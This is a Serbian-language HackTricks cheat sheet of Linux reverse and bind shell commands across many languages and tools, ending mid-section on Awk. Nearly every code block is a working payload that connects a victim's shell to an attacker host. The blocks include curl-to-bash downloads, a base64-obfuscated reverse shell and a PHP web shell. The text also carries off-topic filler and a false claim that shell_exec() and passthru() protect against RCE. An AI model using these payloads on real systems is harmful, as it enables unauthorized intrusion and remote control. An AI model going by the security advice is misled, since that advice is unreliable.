# Shells - Linux

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Ako imate pitanja o bilo kojim od ovih shell-ova, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Kada dobijete obrnuti shell**[ **pročitajte ovu stranicu da biste dobili pun TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Ne zaboravite da proverite i druge ljuske: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.

### Sigurna ljuska sa simbolima
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Objasnjenje Shell-a

1. **`bash -i`**: Ovaj deo komande pokrece interaktivni (`-i`) Bash shell.
2. **`>&`**: Ovaj deo komande je skracenica za **preusmeravanje i standardnog izlaza** (`stdout`) i **standardne greske** (`stderr`) na **istu destinaciju**.
3. **`/dev/tcp/<NAPADAC-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP konekciju ka odredjenoj IP adresi i portu**.
* Preusmeravanjem izlaza i gresaka na ovaj fajl, komanda efektivno salje izlaz interaktivne sesije shell-a na masinu napadaca.
4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao i standardni izlaz (`stdout`)**.

### Kreiraj u fajlu i izvrsi
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Ako naiđete na **RCE ranjivost** unutar Linux-based web aplikacije, mogu postojati situacije kada postaje teško dobiti reverse shell zbog prisustva Iptables pravila ili drugih filtera. U takvim scenarijima, razmotrite kreiranje PTY shell-a unutar kompromitovanog sistema koristeći pipe-ove.

Kod možete pronaći na [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Samo trebate izmeniti:

* URL ranjivog hosta
* Prefiks i sufiks vašeg payload-a (ako postoji)
* Način na koji se payload šalje (zaglavlja? podaci? dodatne informacije?)

Zatim, možete samo **slati komande** ili čak **koristiti `upgrade` komandu** da biste dobili pun PTY (imajte na umu da se pipe-ovi čitaju i pišu sa približnim kašnjenjem od 1.3s).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Proverite ga na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet je protokol za udaljeni pristup koji omogućava korisnicima da se povežu sa udaljenim računarima i upravljaju njima putem tekstualnog interfejsa. Telnet klijent se koristi za uspostavljanje veze sa udaljenim računarom, dok se telnet server koristi za prihvatanje veza i omogućavanje udaljenog pristupa.

Telnet se često koristi za administraciju udaljenih računara, ali može se koristiti i u zlonamernim aktivnostima. Napadači mogu iskoristiti slabosti u telnet protokolu kako bi dobili neovlašćen pristup udaljenom računaru i izvršavali zlonamerne radnje.

Da bi se zaštitili od napada putem telnet protokola, preporučuje se isključivanje telnet servera i korišćenje sigurnijih alternativa kao što su SSH (Secure Shell) ili VPN (Virtual Private Network). SSH pruža enkriptovanu komunikaciju i autentifikaciju korisnika, dok VPN omogućava sigurnu vezu između lokalne mreže i udaljenog računara.

Ukoliko je telnet server neophodan, treba preduzeti odgovarajuće mere zaštite, kao što su korišćenje snažnih lozinki, ograničavanje pristupa samo na određene IP adrese ili korišćenje dodatnih sigurnosnih mehanizama kao što su dvofaktorska autentifikacija.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Napadač**
```bash
while true; do nc -l <port>; done
```
Da biste poslali komandu, zapišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)

**Žrtva**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python je popularan programski jezik koji se često koristi u različitim oblastima, uključujući i hakovanje. Ovde su neke osnovne tehnike koje možete koristiti u Pythonu za hakovanje:

- **Shell skripte**: Python može biti korišćen za pisanje shell skripti koje mogu izvršavati različite komande na ciljnom sistemu. Ovo vam omogućava da automatizujete određene zadatke i izvršite operacije koje bi inače bile ručne.

- **Mrežno programiranje**: Python ima bogatu biblioteku za mrežno programiranje, što ga čini korisnim za hakovanje mrežnih sistema. Možete koristiti Python za izradu skripti koje mogu skenirati mrežu, izvršavati napade na mrežne protokole ili čak izgraditi sopstvene mrežne alate.

- **Web skraping**: Python ima moćne biblioteke za web skraping, što ga čini korisnim za prikupljanje informacija sa veb stranica. Ovo može biti korisno za prikupljanje informacija o ciljnom sistemu ili pronalaženje ranjivosti na ciljnim veb aplikacijama.

- **Reverse engineering**: Python se često koristi za reverse engineering, proces analize i razumevanja rada softvera. Možete koristiti Python za dekompilaciju i analizu binarnih fajlova, kao i za izradu alata za analizu malvera.

- **Exploit razvoj**: Python je popularan jezik za razvoj eksploita, koji su programi ili skripte koji iskorišćavaju ranjivosti u softveru. Možete koristiti Python za razvoj eksploita koji mogu biti korišćeni za hakovanje ciljnih sistema.

Python je moćan jezik za hakovanje koji vam omogućava da izvršavate različite zadatke. Bez obzira da li je u pitanju automatizacija, mrežno hakovanje ili analiza softvera, Python može biti koristan alat u vašem arsenalu.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl je popularan jezik za skriptiranje koji se često koristi u različitim sigurnosnim alatima i tehnikama hakiranja. Perl je moćan jezik koji pruža mnoge funkcionalnosti i mogućnosti za manipulaciju podacima i automatizaciju zadataka.

Evo nekoliko korisnih Perl funkcija i tehnika koje se često koriste u hakiranju:

- **system()** funkcija se koristi za izvršavanje sistemskih komandi iz Perl skripte. Može se koristiti za izvršavanje komandi kao što su pokretanje programa, pretraživanje datoteka ili izvršavanje operativnih sistema.

- **open()** funkcija se koristi za otvaranje datoteka u Perl skripti. Može se koristiti za čitanje ili pisanje podataka u datotekama, kao i za manipulaciju sadržajem datoteka.

- **chomp()** funkcija se koristi za uklanjanje novog reda ili drugih belina sa kraja stringa. Ovo je korisno kada se radi sa korisničkim unosima ili čitanjem podataka iz datoteka.

- **split()** funkcija se koristi za razdvajanje stringa na osnovu određenog razdelnika. Ovo je korisno kada se radi sa podacima koji su grupisani zajedno, kao što su IP adrese ili URL-ovi.

- **join()** funkcija se koristi za spajanje elemenata niza u jedan string. Ovo je korisno kada se radi sa podacima koji su raspoređeni u nizu, kao što su liste korisničkih imena ili adrese e-pošte.

- **regex** (regularni izrazi) se često koriste u Perl-u za pretragu i manipulaciju tekstualnih podataka. Regularni izrazi omogućavaju precizno pretraživanje i filtriranje podataka na osnovu određenih obrazaca.

Perl je veoma fleksibilan jezik koji omogućava programerima da izvršavaju različite zadatke i manipulišu podacima na efikasan način. Kombinacija Perl-a sa drugim alatima i tehnikama hakiranja može biti veoma moćna i korisna u svetu hakiranja.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby je dinamički, objektno-orijentisani programski jezik koji je popularan među programerima. Ovaj jezik je često korišćen za razvoj veb aplikacija i ima mnoge korisne funkcionalnosti.

### Instalacija

Da biste instalirali Ruby na Linux operativnom sistemu, možete koristiti sledeću komandu:

```bash
sudo apt-get install ruby
```

### Pokretanje Ruby skripte

Da biste pokrenuli Ruby skriptu, koristite sledeću komandu:

```bash
ruby ime_skripte.rb
```

### Interaktivni Ruby

Možete pokrenuti interaktivni Ruby konzol koristeći sledeću komandu:

```bash
irb
```

### Osnovni koncepti

Ruby ima mnoge osnovne koncepte koji su važni za razumevanje jezika. Evo nekoliko ključnih pojmova:

- Promenljive: Ruby koristi promenljive za čuvanje vrednosti. Promenljive se deklarišu koristeći znak "$" ili "@", u zavisnosti od njihovog opsega.
- Metode: Metode su blokovi koda koji se izvršavaju kada se pozovu. Metode mogu imati argumente i mogu vraćati vrednosti.
- Klase: Klase su šabloni koji definišu objekte. Objekti su instance klasa i imaju svoje atribute i metode.
- Moduli: Moduli su kolekcije metoda koje se mogu koristiti u više klasa. Moduli se uključuju u klase koristeći ključnu reč "include".

### Primer Ruby skripte

Evo jednostavnog primera Ruby skripte koja ispisuje "Hello, World!":

```ruby
puts "Hello, World!"
```

Ova skripta koristi metodu `puts` za ispisivanje teksta na konzolu.

### Korisni resursi

Ruby ima bogatu zajednicu i mnogo korisnih resursa za učenje jezika. Evo nekoliko preporučenih resursa:

- [Ruby dokumentacija](https://www.ruby-lang.org/en/documentation/)
- [RubyGems](https://rubygems.org/) - biblioteka Ruby paketa
- [Ruby Toolbox](https://www.ruby-toolbox.com/) - pregled popularnih Ruby biblioteka

Sada kada imate osnovno razumevanje Ruby jezika, možete početi da istražujete i koristite njegove moćne funkcionalnosti. Srećno programiranje!
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP (Hypertext Preprocessor) je popularan jezik za programiranje koji se često koristi za razvoj web aplikacija. Ovaj jezik je posebno pogodan za izradu dinamičkih i interaktivnih web stranica.

### Pokretanje PHP skripti

Da biste pokrenuli PHP skriptu na Linux sistemu, prvo morate imati PHP instaliran na vašem računaru. Možete proveriti da li je PHP instaliran tako što ćete otvoriti terminal i uneti sledeću komandu:

```bash
php -v
```

Ako je PHP instaliran, trebali biste videti verziju PHP-a koja je instalirana na vašem sistemu.

Da biste pokrenuli PHP skriptu, možete koristiti sledeću komandu:

```bash
php putanja/do/skripte.php
```

### Izvršavanje sistema

U PHP-u možete izvršavati sistemsku komandu koristeći funkciju `exec()`. Ova funkcija vam omogućava da pokrenete sistemsku komandu i dobijete izlaz kao rezultat.

```php
<?php
$output = exec('ls');
echo $output;
?>
```

U ovom primeru, funkcija `exec('ls')` izvršava komandu `ls` koja prikazuje sadržaj trenutnog direktorijuma. Rezultat se smešta u promenljivu `$output` i zatim se prikazuje na ekranu pomoću funkcije `echo`.

### Remote Code Execution (RCE)

Remote Code Execution (RCE) je tehnika koja omogućava napadaču da izvrši proizvoljan kod na udaljenom serveru. Ova tehnika se često koristi za dobijanje neovlašćenog pristupa serveru i izvršavanje zlonamernih aktivnosti.

Da biste izvršili RCE u PHP-u, možete koristiti funkciju `system()`. Ova funkcija vam omogućava da izvršite sistemsku komandu na udaljenom serveru.

```php
<?php
$command = $_GET['cmd'];
system($command);
?>
```

U ovom primeru, korisnik može proslediti sistemsku komandu putem parametra `cmd` u URL-u. Ta komanda se zatim izvršava na serveru pomoću funkcije `system()`. Ova vrsta koda može biti veoma opasna, jer omogućava napadaču da izvrši bilo koju sistemsku komandu na serveru.

### Zaštita od RCE

Da biste se zaštitili od RCE napada, trebali biste pratiti sledeće smernice:

- Nikada ne prosleđujte korisnički unos direktno u sistemsku komandu.
- Validirajte i filtrirajte korisnički unos pre nego što ga koristite u sistemskoj komandi.
- Koristite sigurne alternative za izvršavanje sistema, kao što su funkcije `shell_exec()` ili `passthru()`, koje imaju ugrađenu zaštitu od RCE napada.
- Ažurirajte PHP na najnoviju verziju kako biste iskoristili najnovije sigurnosne zakrpe i ispravke grešaka.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java je popularan programski jezik koji se koristi za razvoj različitih vrsta aplikacija. Ovde su neki korisni saveti i trikovi za rad sa Javom:

- **Kompajliranje Java koda**: Java se kompajlira u bajtkod koji se može izvršiti na Java virtuelnoj mašini (JVM). Da biste kompajlirali Java kod, koristite komandu `javac` sa putanjom do izvornog fajla. Na primer: `javac HelloWorld.java`.

- **Pokretanje Java programa**: Nakon kompajliranja Java koda, možete pokrenuti program koristeći komandu `java` sa imenom glavne klase. Na primer: `java HelloWorld`.

- **Upravljanje paketima**: Java koristi pakete za organizaciju koda. Da biste koristili klase iz drugih paketa, morate ih uvesti koristeći ključnu reč `import`. Na primer: `import java.util.Scanner;`.

- **Manipulacija stringovima**: Java ima bogat skup metoda za manipulaciju stringovima. Na primer, možete koristiti metodu `length()` za dobijanje dužine stringa, ili metodu `substring()` za izdvajanje podstringa.

- **Rad sa nizovima**: Java podržava rad sa nizovima. Možete kreirati niz koristeći sintaksu `tip[] imeNiza = new tip[veličina];`. Na primer: `int[] brojevi = new int[5];`.

- **Obrada izuzetaka**: Java podržava obradu izuzetaka koristeći blok `try-catch`. Možete staviti kod koji može izazvati izuzetak u blok `try`, a zatim obraditi izuzetak u bloku `catch`. Na primer:

```java
try {
    // Kod koji može izazvati izuzetak
} catch (Exception e) {
    // Obrada izuzetka
}
```

- **Upotreba biblioteka**: Java ima veliki broj biblioteka koje vam mogu pomoći u razvoju aplikacija. Možete uvesti biblioteku koristeći ključnu reč `import` i koristiti njene klase i metode u svom kodu.

Ovo su samo neki od osnovnih saveta i trikova za rad sa Javom. Java je moćan jezik sa mnogo mogućnosti, pa je važno istražiti i proučiti sve njegove funkcionalnosti kako biste postali efikasan Java programer.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat je alatka koja se koristi za slanje i primanje mrežnih paketa preko TCP ili UDP protokola. Može se koristiti kao zamena za tradicionalne alatke poput netcat-a. Ncat pruža dodatne funkcionalnosti kao što su enkripcija, autentifikacija i mogućnost preusmeravanja portova.

### Instalacija

Ncat je deo Nmap paketa, pa ga možete instalirati zajedno sa Nmap-om. Evo kako to možete uraditi na različitim Linux distribucijama:

- Debian/Ubuntu: `sudo apt-get install nmap`
- CentOS/Fedora: `sudo yum install nmap`
- Arch Linux: `sudo pacman -S nmap`

### Korišćenje

Ncat ima mnogo korisnih opcija koje vam omogućavaju da prilagodite svoje mrežne veze. Evo nekoliko osnovnih primera:

- Slanje podataka preko TCP-a: `ncat <adresa> <port>`
- Slanje podataka preko UDP-a: `ncat -u <adresa> <port>`
- Slanje datoteke preko TCP-a: `ncat -q 0 <adresa> <port> < datoteka`
- Primanje podataka preko TCP-a: `ncat -l <port>`
- Preusmeravanje porta: `ncat -l <port> --sh-exec "ncat <adresa> <port>"`

### Napredne funkcionalnosti

Ncat takođe pruža neke napredne funkcionalnosti koje mogu biti korisne tokom testiranja penetracije. Evo nekoliko primera:

- Enkripcija sa SSL/TLS: `ncat --ssl <adresa> <port>`
- Autentifikacija sa korisničkim imenom i lozinkom: `ncat --ssl --ssl-identity <certifikat> --ssl-key <ključ> --ssl-trustfile <poverenje> --ssl-verify`
- Snimanje mrežnog saobraćaja: `ncat -l <port> --output <datoteka>`
- Preusmeravanje mrežnog saobraćaja na drugi IP: `ncat -l <port> --sh-exec "ncat <novi_ip> <port>"`

Ncat je moćan alat koji vam omogućava da efikasno upravljate mrežnim vezama i izvršavate različite zadatke. Iskoristite njegove funkcionalnosti da biste poboljšali svoje veštine hakovanja.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua je jednostavan, brz i lako proširiv jezik programiranja koji se često koristi za ugrađivanje u druge aplikacije. Lua je dizajnirana da bude jednostavna za korišćenje i ima mali memorijski zahtev, što je čini idealnom za ugrađene sisteme i skriptiranje.

### Pokretanje Lua skripti

Da biste pokrenuli Lua skriptu, prvo morate imati Lua interpreter instaliran na svom sistemu. Nakon toga, možete pokrenuti skriptu tako što ćete je proslediti interpreteru kao argument.

```bash
lua skripta.lua
```

### Osnovni koncepti

Lua koristi jednostavnu sintaksu koja se sastoji od izjava, promenljivih i funkcija. Evo nekoliko osnovnih koncepata koje treba razumeti prilikom programiranja u Lua jeziku:

- **Promenljive**: Promenljive se koriste za čuvanje vrednosti. One mogu biti lokalne ili globalne, i ne moraju biti unapred deklarisane.
- **Tipovi podataka**: Lua podržava osnovne tipove podataka kao što su brojevi, stringovi, tabele i boolean vrednosti.
- **Kontrola toka**: Lua ima ugrađene strukture za kontrolu toka kao što su if-then-else izrazi, petlje i prekidi.
- **Funkcije**: Funkcije se koriste za grupisanje koda i izvršavanje određenih operacija. Lua podržava i anonimne funkcije.
- **Tabele**: Tabele su osnovna struktura podataka u Lua jeziku. One se koriste za čuvanje i organizovanje podataka.

### Proširivanje Lua jezika

Jedna od najmoćnijih karakteristika Lua jezika je njegova sposobnost proširivanja. Možete dodati nove funkcionalnosti Lua jeziku tako što ćete koristiti Lua API i C/C++ programiranje.

Da biste proširili Lua jezik, prvo morate napisati C/C++ biblioteku koja implementira nove funkcije ili tipove podataka. Zatim, tu biblioteku možete povezati sa Lua interpreterom i koristiti nove funkcionalnosti u Lua skriptama.

### Korisni resursi

Evo nekoliko korisnih resursa za učenje Lua jezika:

- [Zvanična Lua dokumentacija](https://www.lua.org/docs.html): Zvanična dokumentacija Lua jezika koja sadrži detaljne informacije o jeziku i njegovim funkcionalnostima.
- [Lua korisnički vodič](https://www.lua.org/manual/5.4/): Korisnički vodič koji pruža detaljan pregled Lua jezika i njegovih mogućnosti.
- [Lua programiranje za početnike](https://www.tutorialspoint.com/lua/index.htm): Online tutorijal koji vam pomaže da naučite osnove Lua programiranja.
- [Lua zajednica](https://www.lua.org/community.html): Lua zajednica koja pruža podršku, resurse i forum za diskusiju o Lua jeziku.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS je open-source, cross-platforma JavaScript runtime okruženje koje omogućava izvršavanje JavaScript koda van pregledača. NodeJS je izuzetno popularan za izgradnju serverskih aplikacija i alata za razvoj. Ovde su neki korisni saveti i trikovi za rad sa NodeJS-om.

### Instalacija NodeJS-a

Da biste instalirali NodeJS, posetite [zvaničnu NodeJS stranicu](https://nodejs.org/) i preuzmite odgovarajuću verziju za svoj operativni sistem. Nakon preuzimanja, pokrenite instalacioni program i pratite uputstva za instalaciju.

### Pokretanje NodeJS skripti

Da biste pokrenuli NodeJS skriptu, otvorite terminal i unesite `node putanja/do/skripte.js`. NodeJS će izvršiti skriptu i prikazati izlaz u terminalu.

### Moduli i paketi

NodeJS koristi sistem modula za organizaciju i ponovno korišćenje koda. Moduli su jedinice koda koje se mogu uvoziti i koristiti u drugim skriptama. NodeJS takođe podržava upravljanje paketima pomoću alata kao što je npm (Node Package Manager).

Da biste instalirali paket pomoću npm-a, koristite komandu `npm install ime_paketa`. Paket će biti preuzet i instaliran u direktorijumu projekta.

### Debugiranje NodeJS aplikacija

NodeJS ima ugrađenu podršku za debugiranje aplikacija. Možete koristiti `console.log()` funkciju za ispisivanje poruka u konzoli radi praćenja izvršavanja koda. Takođe možete koristiti alate kao što su `node-inspector` ili `ndb` za naprednije debugiranje.

### Asinhrono programiranje

NodeJS je poznat po podršci za asinhrono programiranje. To znači da se operacije koje zahtevaju vreme, poput čitanja fajlova ili slanja HTTP zahteva, izvršavaju asinhrono, bez blokiranja izvršavanja drugih operacija. Ovo omogućava efikasnije korišćenje resursa i bolje performanse.

Da biste radili sa asinhronim operacijama, možete koristiti callback funkcije, Promises ili async/await sintaksu.

### Sigurnost NodeJS aplikacija

Kao i kod svake aplikacije, važno je voditi računa o sigurnosti NodeJS aplikacija. Evo nekoliko saveta za poboljšanje sigurnosti:

- Ažurirajte NodeJS i sve zavisnosti na najnovije verzije kako biste ispravili poznate bezbednosne propuste.
- Validirajte ulazne podatke kako biste sprečili napade poput SQL injection ili XSS.
- Koristite sigurnosne biblioteke i alate za proveru ranjivosti.
- Konfigurišite pravilno dozvole i autentifikaciju za pristup resursima.

### Zaključak

NodeJS je moćno okruženje za izvršavanje JavaScript koda van pregledača. Razumevanje osnovnih koncepata i tehnika za rad sa NodeJS-om može vam pomoći da izgradite sigurne i efikasne aplikacije.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Napadač (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Žrtva
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

### Веза соката

Сокат је корисан алат за креирање везе између два система. Можете користити сокат за креирање "бинд" шела, што омогућава да се приступи удаљеном систему и извршавање команди на њему. Да бисте користили сокат за бинд шел, прво морате преузети статичну бинарну датотеку соката са [овог репозиторијума](https://github.com/andrew-d/static-binaries).
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell

Reverse shell (обрnuti školjka) je tehnika koja omogućava hakeru da preuzme kontrolu nad ciljanim sistemom putem udaljenog pristupa. Umesto da haker napada sistem direktno, on uspostavlja vezu sa ciljanim sistemom i koristi je kao "školjku" za izvršavanje komandi. Ova tehnika je korisna u situacijama kada je ciljni sistem zaštićen firewall-om ili drugim sigurnosnim mehanizmima koji sprečavaju direktno povezivanje.

Da bi se uspostavila obrnuta školjka, haker prvo mora da postavi "školjku" na ciljnom sistemu. To se može postići na različite načine, kao što su iskorišćavanje ranjivosti u softveru, slanje zlonamernih fajlova ili izvršavanje socijalnog inženjeringa. Kada je "školjka" postavljena, haker može da se poveže sa ciljnim sistemom i preuzme kontrolu nad njim.

Postoji nekoliko alata i tehnika koje se mogu koristiti za uspostavljanje obrnute školjke, kao što su Netcat, Metasploit i PowerShell. Važno je napomenuti da je korišćenje obrnutih školjki bez dozvole vlasnika sistema ilegalno i može imati ozbiljne pravne posledice. Ova tehnika se uglavnom koristi u okviru etičkog hakovanja ili pentestiranja sistema radi identifikacije sigurnosnih propusta i njihovog otklanjanja.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk je moćan alat za obradu teksta koji se često koristi u Linux okruženju. Ovaj alat omogućava korisnicima da manipulišu i analiziraju tekstualne datoteke na efikasan način.

